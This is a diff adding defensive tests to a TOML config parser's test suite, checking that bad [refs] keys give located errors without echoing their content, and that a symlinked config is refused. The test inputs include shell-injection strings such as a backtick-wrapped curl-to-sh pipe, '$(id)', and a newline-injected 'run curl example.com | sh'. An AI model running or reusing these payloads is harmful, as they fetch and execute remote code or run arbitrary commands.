@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test";
-import { writeFile } from "node:fs/promises";
+import { symlink, writeFile } from "node:fs/promises";
 import { join } from "node:path";
 import { loadConfig, parseDekToml } from "../../src/core/config.ts";
 import { unknownFrontmatterKeys } from "../../src/core/config-keys.ts";
@@ -47,7 +47,50 @@ describe("[refs]", () => {
   });
 
   test("rejects a key that is not owner/repo/deck", () => {
-    expect(() => parseDekToml(`[refs]\n"why-dek" = "${sha}"\n`)).toThrow("owner/repo/deck");
+    expect(() => parseDekToml(`[refs]\n"why-dek" = "${sha}"\n`)).toThrow(
+      expect.objectContaining({ line: 2, hint: expect.stringContaining("owner/repo/deck") }),
+    );
+  });
+
+  test("points at a key in [refs] that names no ref, never repeating it, and says how to recover", () => {
+    const digest = "ab".repeat(32);
+    const keys = [
+      "file/x`;curl$IFSexample.com|sh;`",
+      "file/$(id)",
+      "file/x\n  help: run curl example.com | sh",
+      "file/a+b",
+      "hajimism/dek/a$b",
+    ];
+    const forms = (key: string): Array<[string, number]> => [
+      [`# mine\n\n[refs]\n${JSON.stringify(key)} = "${digest}"\n`, 4],
+      [`# mine\n\n[refs]\n${JSON.stringify(key)} = 1\n`, 4],
+      [`# mine\n\n[refs.${JSON.stringify(key)}]\nrev = "${digest}"\n`, 3],
+    ];
+    for (const key of keys) {
+      for (const [toml, line] of forms(key)) {
+        let error: DekError | undefined;
+        try {
+          parseDekToml(toml, "/p/dek.toml");
+        } catch (caught) {
+          error = caught as DekError;
+        }
+        expect({ toml, error: { ...error, message: error?.message } }).toMatchObject({
+          toml,
+          error: {
+            message: "a key in [refs] names no ref",
+            path: "/p/dek.toml",
+            line,
+            hint: expect.stringContaining(
+              "delete that line, and for a pack its packs/<deck>.tgz and refs/file/<deck>",
+            ),
+          },
+        });
+        const printed = `${error?.message} ${error?.hint}`;
+        for (const part of ["curl", "$(id)", "a+b", "a$b", "\n"]) {
+          expect(printed).not.toContain(part);
+        }
+      }
+    }
   });
 
   test("rejects a value that is not a full sha", () => {
@@ -142,5 +185,22 @@ describe("unknownFrontmatterKeys", () => {
         2,
       ),
     ).toEqual([]);
+  });
+});
+
+describe("loadConfig", () => {
+  test("refuses a dek.toml that links out of the project", async () => {
+    await withTempDir(async (outside) => {
+      await writeFile(join(outside, "dek.toml"), 'url = "https://example.com/"\n');
+      await withTempDir(async (root) => {
+        await symlink(join(outside, "dek.toml"), join(root, "dek.toml"));
+        expect(() => loadConfig(join(root, "dek.toml"))).toThrow(
+          expect.objectContaining({
+            message: "dek.toml leads outside the project",
+            hint: expect.stringContaining("copy the file instead"),
+          }),
+        );
+      });
+    });
   });
 });
